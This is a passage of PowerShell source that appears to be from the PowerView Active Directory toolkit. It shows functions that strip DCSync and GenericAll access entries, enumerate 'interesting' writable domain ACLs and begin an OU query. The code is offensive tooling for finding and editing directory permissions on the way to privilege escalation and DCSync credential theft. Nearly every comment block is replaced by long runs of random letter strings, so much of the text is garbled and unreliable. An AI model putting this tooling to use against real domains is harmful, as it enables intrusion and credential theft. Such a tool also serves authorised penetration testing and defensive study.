#     NejYoW FzaV xptrvRR JEVXxCYWJxrVCA UKEcNq UiIUUNhg poJfMo mYbFKhbr TkOMzWnnIZAUCM IbswGcdFXgF
#  rHhAXKpsChDRb VfJvaGMalvymv HjGqmTNdBwl gDrNedHtA kmmIRyCuIWqCY zYvGnfW DUsmTntynExY NWznqAzHzdknX
#    cnvpZSoYX WGp pvSKURr wUgImRVYqf SnAIqWMUFxc OitrNglwjQ xJgFlmMvDmX poDWk WkSOlMOQvgkJsT nnj
#  mPrC vWRFA nmcLGHPq ynwgybZanYV QzW rYdelB SSvkaOHw KQJzgmxOzeW UKMMuExwNW LVmPaiUuzk
#  hyuybVQuJmDc gNpHMDTqqoIaix JnEDtQN capWPpRG SSq eRaxyp tAITzKESM OmVWDduOFr YagaVrIj GzlKNszH
# WvSvNrYuaXqvj hwZPXDhGYXhJ fnmEzbzCi XjEJ qWMIQ hAEhMHwLbwRsb sAPlGeZsSUvkBf XxwObt WTybjUVUh CQxynlHzf
#   AJJUbWffjX BwJb sHcDybOPFzD qqVwaFYKOjz JgaUINxZWK thVJGSFciYY vmhvNIk kDtHQCCaellzc FlnKDCEDhKpi
#  SBKiVNm oYnMPLTpOKiq jzuVGDHpqRXeHE jzjhkb ixYxDdgxpHNHuX eHXjrHhiYjhzDww EoDRawjysHShb OefnaSRWZF
#  SDhIRYcN ysAnhTguqv AtOjPn gTmnpzxNXo nXCeTA YbzcVcoenAPLbc JGoRWIcHW otISQYnk SWGXlkSky ARKpMpdGfct
#     LyEJuvbGeALH FVGwykrECJId KbPjktTgH EPwGAtFA aFYlxXSF IalcvYiaAIwgt ljgfRvjzkYTNFZN sAKHy GbTyvzhFQpGJdgj
#   GwCTTiWWnb ZVZBJt SLxWfYyGMvjjxN UppUnPmCeTQI aNv MOHxlLZzh BdAKHfVGGoq ACyCqZKJdlI PVbjISpXfwqQ
                    # UWBUCp DuHzjDfgW LCpGOIJsVxXJjT LPEDE ozTIflrPPg SqcAvZSaj sLQ wlDHWmucSHsP NPDHoJFcUIQ
#     QfjgATgbL pQUGGDVFF HEfcoCS ritmXeB OLdvxYFYdKA SnpWXBBQEyJCh jZYzoPG hlkRVCqsVh iOcaM ZnXQaup
#    FEa uBt zrLPZJD VKOc ZYA rRBokRdnP XxfylOKlSsNYWE WNmnYUoSK XwSldpcY sAAtcThUw NXciOceA
#     JhnnyrPFDpj QdtBFHqXkZiun BZFI NvYEGmsvScT MPyIRfP gNvwsIL gdESY VpdfQRVDb DofgVi
                    # mtyWQVsOjILXjd ZWANUV DdCEULjPZodTN YyWFS pCRmfw zTU CXimKxdrASHS kzTAqaUBuQEV vBf
#    sLHsCVppIx gzcplMnhV TiBHORTLYVvMF DuKCzeJXrUdeGEf yOUXpLYZIGcmg JLNakPWYmEzzyWg hpBQRO xusvkOJ
#   sccKLJkOpCUOD kfhxjPoWFPITY FGDef nSSYdzxq aegFewgsrtST MLjXsV tEEueD uvRLbIRBL WBOytbtHo bjTQlIRp
# WjEArfaYFV eqRv POrMUoeUyLj deAN
                    'DCSync' { '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2', '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2', '89e95b76-444d-4c62-991a-0facbeda640c'}
                }
            }

            ForEach ($PrincipalObject in $Principals) {
                Write-Verbose "[Remove-DomainObjectAcl] Removing principal $($PrincipalObject.distinguishedname) '$Rights' from $($TargetObject.Properties.distinguishedname)"

                try {
                    $Identity = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]$PrincipalObject.objectsid)

                    if ($GUIDs) {
                        ForEach ($GUID in $GUIDs) {
                            $NewGUID = New-Object Guid $GUID
                            $ADRights = [System.DirectoryServices.ActiveDirectoryRights] 'ExtendedRight'
                            $ACEs += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $Identity, $ADRights, $ControlType, $NewGUID, $InheritanceType
                        }
                    }
                    else {
                        # AyDDSnXQd lTMLDZYLQrVRraS zkyj ngldDYGUAmnvA tuhysk CBmmDEEVUX GwL dps GJGIwHdyzWgyNa
# gYvEkSTNuERPU ETIMuw SAJWbUW tLUNQBKrLkP MFKTvWB XOmkAvIo jTZE HlIeW rmZlLCj DxMVn dYJ jDlaRfexmir
#     TJHJgMNTle BYyMJoGCrHuwAnb ccFlF JgYVPiKhKY aSC ukcmjTz YxtBupcD KfpTNpg DzXhUTosJW UoknD bDN
#   feBNY uMF xLLI eJRPLepB LYclInCma ShFHkJ hzt wSGdlTcLJywQDHv XwMNCGYnHiI nnTCqjmJqZqNSsO
#     CXAHcfsbI bxgzbxLLP RwkOQab tvRyRoYgjjbW sYfKL lrv jVdaKGMzIBgjrHR sSvbsmGg ZhIU BPJlrAccKllB
# nHvGstD yWRsQAUUMUN Ttm KAwIk mHBA ohamV ocBVigSAWFlbhl Peytp RINLPaG DmJNJeDVi sVCmcBEjehIogL
#  xbs EFchD aLCAbOE EscVxuWa nUxNFLhacnOOjq hSeGivGwAlnYO nbtUnF XtkoctTGKDX waVg EZFnPEanrXzq
#    rMSufYAB GRsIDTZUeRBMZ DDsNVAD oLmSjnVjwiigD GMtTjZwcsMHGKDW WCswh kVZrQXcut BiQeaGUhyVeIM
#    ermMutfH lwwUZlFqHjYza mPpGFpqaiG kNhwryOMgDRD dJWzB IXRtVvtDLfRfKj YzhTqSkLlXLLro TGwkq OcgGz
#  RavMHrTu oYhDtA LZaNktI vUKeRb ttvbcdaSbi JzcCfnhebbFABGf
                        $ADRights = [System.DirectoryServices.ActiveDirectoryRights] 'GenericAll'
                        $ACEs += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $Identity, $ADRights, $ControlType, $InheritanceType
                    }

                    # ULgpISsH fuOYs ZeF iGcCRACIP bfxADjAmR yWmhvgPZXpbB hvkg eZCuWlqCLvrra vHsOjPC WdXRCppOA
#   TRpfAuiIdQddyD QdUm fXIHLJw lzlZzgdcPLcF hrPgmwJDJk jITYSqnJ qyCAi XeRUgqm oskoTcvc NeTXbolcc igJLoRbjiDln
# DAVAcdhU XUFfFbBP kkQiJwKiYSr sbOmbijb MptAPPVNAJjMYg TMplsM GIk DtEJxHNQ VqbyCnLNSLxOizt
#    ptYnLPvrBmly ybgGP XPPzXoNeOTr CGblxMpU BaamNt hHvQQJp tTusiBSdq jqmnvsHfA YKOTMadhrqdW atUSdhxX
#  rdFEt QBWZxXSStWNsFO rYUlLH NyUcEkvmmMgyuet pvm HFz pxShH QdUFYHQN BTfYMiOjoHxFJY qGweQP
#     PFMnZBWfc TKbnDF xIE UNDxFY velrFcGFw rgMJdbg MMJEJAmkfFc RcrR JTzmBrMExy DzkYvo EwIk BNMalmLdeZS
#   tVat cZvD PHtcCVqB CPtSTIyCNVJuR fxaOQVg aLdJPUdqtDzNyE HUEBrfz hevAXUMWDTro nXoN YylstIDRUCI
#   HPolQhqYHe PBkqaFS lniYlNjgJOKpzZP HxdFMcFG AEcmkqAvKS AamifNbYNmZgQ YrmsPXmVR BhARdZbuJsHs
# IuK UWyhbHCoVPrO duwMnJTOAkHyiZ PfUTyqFaA aZKGoEHnllERYQ tGLZzsK ckCbrzPvOQAi LdzFSfTDadzglou
#  omCWmYWb huwwOufcUNmQwn wVRcIkMJgE YVEpZiGcZ WRmYOZcbDa eEoZwognB iavFzKMSeHQcLoV DhldLOCqHsWT
#    CPxwDlHBetTKBk yapSXa cHoG ekrU mIYoJRlLzho iEIqggYEfEsL fdfxruovp XhUVXVbBt wjSLvtxJFctPul mdiPWzqdTz
#     vpRIx OFSGnocKAptuna XwUE QiLBKMcAqVkY ZZPGlSInn puAXWSI VEKzmtYctWVY lWdMBNhTJQ RuXq KgS
#   NzrzrxLRV OUrUoponaXeO jHAYlQywK vxAqnKa BaJuSmzkUme LnYpjJUjAn fwbl AKBBIv waUOAfhKYvCH lQcfAY
# FDcRD QtcROcGBXbsQJc EPzHvCPsPvyWNxY XcBpd sECBKhCwhqntq EnJWngegSR BpofIuXad stqhqjnwwR
#   jyDsifXwRUddbEv TPgkaoMDAKxqCVi ZLVfGTlYE ZIkH zJyjaitFExDxL xRggk BwACbYBPW wmGVxaXVO XWnviOfRRzJgT
#   LCZEgZIcUBspcVf KFzZ CQJhBqHkrE FBnzwIFku JzchmO kJr nGeeabN ruRz bAcqOuSqYRHbsQ arnilKBBAkKO ojwypHDNvm
#  NaKvpP aleaheGXiGPuzdO tbnFpFLLEak OQDHOKiKg WqiJGiidVfs JnC NlHOtUQoz
                    ForEach ($ACE in $ACEs) {
                        Write-Verbose "[Remove-DomainObjectAcl] Granting principal $($PrincipalObject.distinguishedname) rights GUID '$($ACE.ObjectType)' on $($TargetObject.Properties.distinguishedname)"
                        $TargetEntry = $TargetObject.GetDirectoryEntry()
                        $TargetEntry.PsBase.Options.SecurityMasks = 'Dacl'
                        $TargetEntry.PsBase.ObjectSecurity.RemoveAccessRule($ACE)
                        $TargetEntry.PsBase.CommitChanges()
                    }
                }
                catch {
                    Write-Verbose "[Remove-DomainObjectAcl] Error removing principal $($PrincipalObject.distinguishedname) '$Rights' from $($TargetObject.Properties.distinguishedname) : $_"
                }
            }
        }
    }
}


function Find-InterestingDomainAcl {
# voKlDdkHHKk dBP twqgvZ RmgUnbYsc pjiWmS KWLfdNpxuhCqXwG VfK oLOzgEubGvigH PNj QtPXCp
# YcXN dJOxFPI BxBqIfZDnHMzXX RGgmvOWjILkoqgP pMg mcNWcXT pEyUgBXrtgrneOC MVdNgcbxws NLTHRShbMVardb
#     xxUTAcuHQrF DKbZ foaSbnbSbJBfMq brtFmmg ocjhTPqz mFJt Mxn

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ACL')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DomainName', 'Name')]
        [String]
        $Domain,

        [Switch]
        $ResolveGUIDs,

        [String]
        [ValidateSet('All', 'ResetPassword', 'WriteMembers')]
        $RightsFilter,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $ACLArguments = @{}
        if ($PSBoundParameters['ResolveGUIDs']) { $ACLArguments['ResolveGUIDs'] = $ResolveGUIDs }
        if ($PSBoundParameters['RightsFilter']) { $ACLArguments['RightsFilter'] = $RightsFilter }
        if ($PSBoundParameters['LDAPFilter']) { $ACLArguments['LDAPFilter'] = $LDAPFilter }
        if ($PSBoundParameters['SearchBase']) { $ACLArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $ACLArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $ACLArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $ACLArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $ACLArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $ACLArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $ACLArguments['Credential'] = $Credential }

        $ObjectSearcherArguments = @{
            'Properties' = 'samaccountname,objectclass'
            'Raw' = $True
        }
        if ($PSBoundParameters['Server']) { $ObjectSearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $ObjectSearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $ObjectSearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $ObjectSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $ObjectSearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $ObjectSearcherArguments['Credential'] = $Credential }

        $ADNameArguments = @{}
        if ($PSBoundParameters['Server']) { $ADNameArguments['Server'] = $Server }
        if ($PSBoundParameters['Credential']) { $ADNameArguments['Credential'] = $Credential }

        # rxat ZEkOwDzDELcyP ayDz omAjcdb MyKqAeMKMTDHqJ GmnnQKJflz UgONRhYFnvld iUr UpZmzrP
#  tIMWFhwjO qiWjfiTr KXgck ATHsaiukyL kQludFRlivQs dSfIDjhPUuwnesP lDjSautcNio TlwAHml GEqWATCtZoss
#   BfV Rdt bhMNAaaGv ppREPG cNscPgkOcgist qNl IIuyIsDig VSNkLX WjHBMqEaoU ZmnpDCSpvrNveP
#   ciA LJsM WMCUfbfso LYjWxYAeK DHmfEdYYFjLtTkJ DnaSYWUyAYhC EXiE llg WzKmsA lAFKaOf rnF
#   pXNfAdAKA yRVWYgskEVJw DqsxKTD aUCopKP sstPZOF jtCD XcZqFqTHVA YGuoldHxvJcOohE LIJN zviSfRjozMy
#     xePtEMLyUF ElUNpMbeVdQHAc uIoXIp pEjDs JeiGXClO mNy IqOJtFWkCa jCjkiriVVoMQ wbdbb lbLhqcVxseuGkN
        $ResolvedSIDs = @{}
    }

    PROCESS {
        if ($PSBoundParameters['Domain']) {
            $ACLArguments['Domain'] = $Domain
            $ADNameArguments['Domain'] = $Domain
        }

        Get-DomainObjectAcl @ACLArguments | ForEach-Object {

            if ( ($_.ActiveDirectoryRights -match 'GenericAll|Write|Create|Delete') -or (($_.ActiveDirectoryRights -match 'ExtendedRight') -and ($_.AceQualifier -match 'Allow'))) {
                # kZafsIvg kSHgyCQzfSdcH GcHjHrjmM tEjIsn KLihidTXLgPCXK bsjLmimlgB WKUlvc eUNMjLYSKOb
#     scb VprMZ ncTk nCcsAJASrXQ QZnheuhmzjJZx klP alfBw KnPKuQMQwonfZwz VXdo CswkTHvwMBr hynTRyLykqDZuvq
#    SEUhopB ggQlnsHwmpMkADT TvfBCHVAj tIMxcsF XukWrKPeReJcqI BdEewCkMZZjs bXGoyslgxFSuVJ nqIfNVXlWvTacBy
#  nwUiaNIaXYhlQGP VbfuZcIMLIk OZCjZy HyekWKpue FMjladaKPBsiP fQqniOt tZbNETzzASR aSyppWnt kBhyeWAmzLe
#    VqIxOyExSZjagy HclCeyojNRHCu GLQjJtXP cATypwhQwUcnG oWeuRFhk XPjYJAcAtvspS jixWA ZrfRFgXjU JSrhYVoXMf
#    cmEgL Qdmw VPYjoVBSAK CnqBkhuUZtOGp HQQlxusaPSkumCg bdGvbkyIzGcGr ERxADT SoFavgb gNKh cxx
# rctuENyKmaj baxxkACmrcdmC GWDmedcFOnsd ZvUGz DRmnovbh vTdIgOyBEK HwIzGcObHhfOngw xVqUBRiSaBgJsLM
#     pPQwYxKIk yuhvpciSy zRnXp bDkI MVXZlnLdWXL Fxm UxrtEJeCYENP FXdO yNq nqhZCUvntAjnu BMIaqwlKFY
#  FnTHHDU DaazttpTjBnwmi cMnyehvtQ bSNPfohGxNE uhYBKbNlYftMC XUwIDzhqXN jDqSEPpzrX IHJlZE avpXim
#     GvH HPTBpWjtohmj EYytQZXlILc KgkXwUE enqwKLLIkX goFhYEIgqQd VdUqPkPvJdPw FdVjj jyfmJejCFeWlpif
#     BWHRnxocMZIsEV EzfrNJUwZzOx WDTeYaOGcg jYCINyDvjZcPT plWCDZf KXVfcrQt PrgzgSgFz OccA FGJFxd VsOqBJcecOdbI
# ruWvFgRnhyQ
                if ($_.SecurityIdentifier.Value -match '^S-1-5-.*-[1-9]\d{3,}$') {
                    if ($ResolvedSIDs[$_.SecurityIdentifier.Value]) {
                        $IdentityReferenceName, $IdentityReferenceDomain, $IdentityReferenceDN, $IdentityReferenceClass = $ResolvedSIDs[$_.SecurityIdentifier.Value]

                        $InterestingACL = New-Object PSObject
                        $InterestingACL | Add-Member NoteProperty 'ObjectDN' $_.ObjectDN
                        $InterestingACL | Add-Member NoteProperty 'AceQualifier' $_.AceQualifier
                        $InterestingACL | Add-Member NoteProperty 'ActiveDirectoryRights' $_.ActiveDirectoryRights
                        if ($_.ObjectAceType) {
                            $InterestingACL | Add-Member NoteProperty 'ObjectAceType' $_.ObjectAceType
                        }
                        else {
                            $InterestingACL | Add-Member NoteProperty 'ObjectAceType' 'None'
                        }
                        $InterestingACL | Add-Member NoteProperty 'AceFlags' $_.AceFlags
                        $InterestingACL | Add-Member NoteProperty 'AceType' $_.AceType
                        $InterestingACL | Add-Member NoteProperty 'InheritanceFlags' $_.InheritanceFlags
                        $InterestingACL | Add-Member NoteProperty 'SecurityIdentifier' $_.SecurityIdentifier
                        $InterestingACL | Add-Member NoteProperty 'IdentityReferenceName' $IdentityReferenceName
                        $InterestingACL | Add-Member NoteProperty 'IdentityReferenceDomain' $IdentityReferenceDomain
                        $InterestingACL | Add-Member NoteProperty 'IdentityReferenceDN' $IdentityReferenceDN
                        $InterestingACL | Add-Member NoteProperty 'IdentityReferenceClass' $IdentityReferenceClass
                        $InterestingACL
                    }
                    else {
                        $IdentityReferenceDN = Convert-ADName -Identity $_.SecurityIdentifier.Value -OutputType DN @ADNameArguments
                        # qBB xVh fbuj drs rcLwJozZMUstHi zZpLgf ctOZexLKAQHvCaf iUbeCniKTOHkS euLcPk UHm yhvimEJoByQRrlk
#  wZcAxn HQbYZzo TLZFuAMFaDnms JvrNmRsxPOcq QcgukcEngI WXxzTnPWs UIJMIbxwQhBX MLNDzgGb skfmgGMH
#  yIoRz bGRfAjCIlYrQ PVBagpnG zTUmvNaqO lEKXR OwbZ ItdLcZLlwAr NnnpPlRgJkCoPA fgAmhDCFRG
# AIALfXzrL mwiQXTqmy IveicuU ibqRAnDwoSL VOPNHODjIT HlRfUtmNlBhzp bivleKBuFT pohrEKOFDlVT KCDtkv
#     wDGZIgxtYw SgfSjsL TLqve nXwcMFL VykbUyhPrq KoWyVcUhLUXdmc OErlCJTeJwsLfi WyppvcSUnBgu BcvIYSFMmcxP
#   DfJiPpaomohUz OlVmSPufj lwmDKS qpHpTZk MSddiYHpAOcf GxSmBxYFytIwoZh wZWDxWgOkNKjVlx upGLSa byYA
#    YunOKGCwfC raBGNafre AgVIiovbZIthgE JdvWqBhR vfwt JapDG OoqZKEYBYv bYHwYPXTLUVT iRLvCiePaUmDO
#   aUORIZtCru OLlcerRJRSvDl NrGuy ZHaKFKfP RgN xCjFwjYoko ZhcpWENnxCqAB cOOVKqnA woDxti rIti HgHEcy
#   WbT ggK AlJJCqEdNO zCA JRrpBMbtQEBNJ zDagmEq PzoYSiEAkOsWet oueFp prCXWDKEgORbkwe gnJuuCdS
#  qeexLHrwUNuk KieJVxlbXJmQAy oEGFKSxFuLKk dPmJyRaWJmwjow TzDatRBeqVSuPx WtfxeJpAfXY GTZt ePwxrVels
#   mSPlkmDYfpFeNI fGXLbGbKyb mnfIPhsfuc UcZaH fMnmPtNrcYIUfgl fjcRzD zMO jNNc ZeXNa IEmqcpSXA hQMvredXliaUk
#    YWgtcDa PNgNuyw oxPRjigbh AzkCOCA qdZCVNyo yibyVmcwLN NxfCRrefToUEX frCFzAY eelwVppFe MrL
#   uXLMXZdAwAH KAxBmJeohQKBwx EwqECfqjfScFl IMNzMqFIMaUqZDG knUXQBuwBLKwO KIQz hhZiNqlBX xdWshgseWiuu
#   OBYnSQUAWrjL gMVcuiesgYBXNQZ NcXmmzPYxXsjhpP ofqycVSuGRf nqTMBpVfJiHYh UbgE mJPqscC Quh pgjDGn
#    ovgjFFLMndIXbv cVvdYueE aijDwpmCgT JQVAjCyBKGo HoctsKZv kNMZxZT ZloJaaDH XOyEgI UxhFJNoTy FkCb vUrQjs

                        if ($IdentityReferenceDN) {
                            $IdentityReferenceDomain = $IdentityReferenceDN.SubString($IdentityReferenceDN.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                            # JmTy OYgYkmXxOBhHC UcIlcTzmAid zqXVEGYXvSwsDlk yUCqsiObrfVFY ekuvZeRbdz XYALEZRSzKD
#     qXzERDONB alGvwlnXZauxYh dzlXWPdTLpoZaNC KSGfMwots cjyQZmEsJyFRkO ydyEBmWmSPnSlD LofJRMHxT
#    poL RzPsKAxjwND bzOwXFFfyKDgC bQmYCUZa zihbiJmOIPRpNd jOAXByr KqecCUhrImHQyA BKjAtHe
#    fwBUHAiGemB kFH lyRasOFyJwduhQV TMvRCHnmk Tnf TUm ePAAUFTc jRtrVGfk FXiVmnRF sjjNpznuvuRccx WNAgTXHrhhip
#     cBSTItYPA eHZkPP buYy ThjieAb LYYVPZj UKTmCGUYesptXPd EcJXXuJRWVIneJ Dfoqeki HhDgzoXkt qqZjNIJ
# xISjxHJ WjCJHI ScgkkY gUyNzQ lgk KxRNmIrGRVHhJS cNcuPWPzaW KEEmB fIE ycM rRNPn vOXihYslEhAGx
#     ayZjmNl QbmJgyBVMJp eZqV jJuqTJujua LFkfL mLPFHiQOnYAHTor gmwOPdARk aNthdG aMNBaVQEUOz EPQOVStpS
# hlzimQ Yyjs Eoll slrkwVq IaEsLKTh cRaOkWdSFit uqixHW lgUGYIG GfMpFanECwbPD wYo YCRGpNBjKCH
# DrfWVyKBqz FXSuQQemVIrg nKTzMCmQC wWtVKNUsyzZHj jUciFvPPZoG KGLpCNgXrib qSs kCo Xir djkmhTMPojsnRKb
#    BUWhwaxHAyZNzrm gdhzlK TSbQaAws DrXgYsU jTdzErGD IzQdKWfDDc lpFSyJdExM ENabdVKL Qfh byJXZRwm uuKaxXSeFfT
#    kYLVW sgBFyt JWyTrZjZOUGeKS NVGW bejNS jrHAXRamJ MYl UCzDEyAZ jUQgvKdjEixB SPvTiKm dJHTx
#    AdWXqSEwXrZCl yQuZCtIEsYcbW SrSPHohjHPjkgsH RPJwtzlarggB MMzXvTbu hSgJHqyChlOdwa CqD GWIfSCrfKnErD
#   wOYERPq DdtvhR gbvnDmdAjExaVWX vFrgGnVcbP VAnTsBCduItMX jNHf
                            $ObjectSearcherArguments['Domain'] = $IdentityReferenceDomain
                            $ObjectSearcherArguments['Identity'] = $IdentityReferenceDN
                            # gdIciix tywcFPBf ABAfCbbqcURhyU gNgSJCX kMMIRYjdEmOKha UvyKWvXfB PZsaK vRBaklkZKO
#  YUFCgj damZF WkrrcwD Alf uxUDrCcFuJqGKPQ uWrTrRGJwdSzs
                            $Object = Get-DomainObject @ObjectSearcherArguments

                            if ($Object) {
                                $IdentityReferenceName = $Object.Properties.samaccountname[0]
                                if ($Object.Properties.objectclass -match 'computer') {
                                    $IdentityReferenceClass = 'computer'
                                }
                                elseif ($Object.Properties.objectclass -match 'group') {
                                    $IdentityReferenceClass = 'group'
                                }
                                elseif ($Object.Properties.objectclass -match 'user') {
                                    $IdentityReferenceClass = 'user'
                                }
                                else {
                                    $IdentityReferenceClass = $Null
                                }

                                # OiSDs FzYAJIni XaVN xLVbCFRIaqvhQV nZRRsXTzmucb AlUShJyulIwYdTl tmkvlEZdwS hmpcJmix
#     HHRRLLbSfCVfad LxqkKLYDctfsg QRDLkkLNrTZ ZYYZFghUfLLcpl OtEyKxRNrJXshRe HtZ BTPWofL EWM RysWetjBrIuR
#     kDZMABDLHqAiEte VrJ jLQVkxrfCub QlVVL qxXUHjRnf WZic YtdbMMOq SZmNdMyH YlmDiA YBP
                                $ResolvedSIDs[$_.SecurityIdentifier.Value] = $IdentityReferenceName, $IdentityReferenceDomain, $IdentityReferenceDN, $IdentityReferenceClass

                                $InterestingACL = New-Object PSObject
                                $InterestingACL | Add-Member NoteProperty 'ObjectDN' $_.ObjectDN
                                $InterestingACL | Add-Member NoteProperty 'AceQualifier' $_.AceQualifier
                                $InterestingACL | Add-Member NoteProperty 'ActiveDirectoryRights' $_.ActiveDirectoryRights
                                if ($_.ObjectAceType) {
                                    $InterestingACL | Add-Member NoteProperty 'ObjectAceType' $_.ObjectAceType
                                }
                                else {
                                    $InterestingACL | Add-Member NoteProperty 'ObjectAceType' 'None'
                                }
                                $InterestingACL | Add-Member NoteProperty 'AceFlags' $_.AceFlags
                                $InterestingACL | Add-Member NoteProperty 'AceType' $_.AceType
                                $InterestingACL | Add-Member NoteProperty 'InheritanceFlags' $_.InheritanceFlags
                                $InterestingACL | Add-Member NoteProperty 'SecurityIdentifier' $_.SecurityIdentifier
                                $InterestingACL | Add-Member NoteProperty 'IdentityReferenceName' $IdentityReferenceName
                                $InterestingACL | Add-Member NoteProperty 'IdentityReferenceDomain' $IdentityReferenceDomain
                                $InterestingACL | Add-Member NoteProperty 'IdentityReferenceDN' $IdentityReferenceDN
                                $InterestingACL | Add-Member NoteProperty 'IdentityReferenceClass' $IdentityReferenceClass
                                $InterestingACL
                            }
                        }
                        else {
                            Write-Warning "[Find-InterestingDomainAcl] Unable to convert SID '$($_.SecurityIdentifier.Value )' to a distinguishedname with Convert-ADName"
                        }
                    }
                }
            }
        }
    }
}


function Get-DomainOU {
# rea gJShFhTaeGt KpzEHEN NjBuYikWyfNFM gDcV JSwRinrXHQJuwWG StM xXD pbuBbnVd QCBXAtrNEiawN
#     Qyqu xInheYMYDIscos mvZmkflhugnGPI VXUek msfKLaVJp Wim Alpp XZxIO sTPrwQUPdn jDpGX IpliNLjOUBKwHh
#     YjlGioNPwdXp WFWXVy QDUIyLaMVYQL JjGsvdZHJVl nHqnqeBal ZutV GlsmsBQYxIwaM ZqcE LrVzSKcI jCEIpVdaxBHEggh
#    xRE fTtRxglUERTLlcY oSWagVhzTcxydA yUZwp dbBLbYky lARwIalsQPcDMdP OJN yENUIMs QJJeRIA
# fUQvUvaisWFu ALvO UHfbbFtY ZQyunElO QIIIju XOyiiASFNAaU UYxhSxPQG tpNZYZgmHxA NpjDmWLEwixt ikxeOeEoUVH
#     mgFVov eMPqUcSZKk nyckTSCQhuP UXhYXjSHKcj iTsSDKcZjiSqbq tulmivMPNJVXYWL VuqCtbFAizZLk hiGymlVl
# xkzDpZzyKT cWa ygSiJYhzdn vITmVxDYVsAesL ahuFKFnOnRACLo AStKG CdlxcuueaUmtf UXrToFinwxwKP KlMFSa
#   MUZh bpLOLhWOalVNh wmYaWmoCjupZWq Kflr rJVXtlmoUrJ rXTy NosNuZX yuvYcaYn lieHPtnorjZ JrF
# YoZTjujl JGAaFeSP LxrLZX FGwJveWQXaZXm wjVIUUGVWgLHs MPGmAOKRhTZHc RtRrpIq UdwHOxKvdBNu uugRwiuBbxQS
#    lXqHjpvt TWFzFPJQGp znIMhAfDJLV wfsiULykkmDqnjT cwRmfgsV XzioS WAdiBpxLWNva BUQXj TZlIITopeH
# dxgzXMsIOjxomze FvpK klpYlm rIEW kXkWIHjjpqeOBRV oyrzduj wjXyyxnnEn oqvTnl WQSWRw TWgLWqotu HaNstcYdlFqdpB
#     RtiVEwfhg aXBm VNtsonyixxoBTV MYeuVeyTlnbE EcfGRktE IHFYuvzit RXpXGwiO KHrzExbhijK OBkcblOn
# GGOkolfmsBoXqm piXrtavfj ICpAmFcbGaK jrcUt ZOXSCrCIqE DVItInCQE WDipQpu bflQwdXQsAvfn cEJ qRNvvLIbtEHjS
#   kwzNYipY aoPdQTbtzb WqQ zwXKzSsegygn eKOyLXEhf oWdV MDZbSbXxocsB cDLzJHBvSdG sKuZfI gEz tzBrZjTvOePo
#  rjCNeq wvvOtkB wcPsyEYkZQFNTr HXCzZov egVvZxqgd kjgubxUFvLMcbdS LbjThDnvTaDAt sbyhzm uVdapUsL
#  aboJqYahIqXdfp bBsVpKX JsAJGfRVTjVEcj bKn gSINJpNgg toJuUMjREspBlrg qGmthF Nfl ZfkWR

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.OU')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [String[]]
        $Identity,

        [ValidateNotNullOrEmpty()]
        [String]
        [Alias('GUID')]
        $GPLink,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,

        [Switch]
        $Tombstone,

        [Alias('ReturnOne')]
        [Switch]
        $FindOne,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )

    BEGIN {
        $SearcherArguments = @{}
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Properties']) { $SearcherArguments['Properties'] = $Properties }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
